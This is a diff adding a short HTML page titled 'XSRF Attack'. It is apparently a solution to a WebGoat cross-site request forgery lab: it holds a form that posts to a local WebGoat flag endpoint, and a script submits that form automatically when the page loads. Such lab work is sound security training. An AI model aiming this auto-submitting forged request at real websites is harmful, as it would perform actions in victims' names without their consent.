@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <title>XSRF Attack</title>
+</head>
+<body>
+    <form action="http://localhost:8080/WebGoat/csrf/basic-get-flag" method="post"></form>
+    <script>
+    console.log("Start Attack");
+    document.querySelector("form").submit()</script>
+    
+</body>
+</html>
